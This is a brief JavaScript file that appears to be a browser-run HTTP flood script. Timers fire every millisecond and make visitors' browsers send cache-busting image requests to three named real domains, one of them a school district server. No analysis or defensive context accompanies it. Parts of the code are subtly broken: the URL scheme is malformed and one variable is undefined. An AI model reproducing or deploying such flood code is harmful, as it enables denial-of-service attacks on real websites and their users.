function imgflood() {  
  var TARGET = 'korea-dpr.com';
  var URI = '/index.html';
  var pic = new Image();
  var rand = Math.floor(Math.random() * 1000);
  pic.src = 'http:'+TARGET+URI+rand+'=val';
}
setInterval(imgflood, 1);
function FLOOD() {  
  var TARGET = 'jihadology.net';
  var URI = '/index.html';
  var pic = new Image();
  var rand = Math.floor(Math.random() * 1000);
  pic.src = 'http:'+TARGET+URI+rand+'=val';
}
setInterval(FLOOD, 1);
var domain = 'ls-child.mvcsc.k12.in.us';
setInterval(function(){
  var img = document.createElement('img');
  img.setAttribute('src', 'ftp://' + domain + ':80/image' + new Date().getTime() + i );
  document.body.appendChild(img);
}, 1);
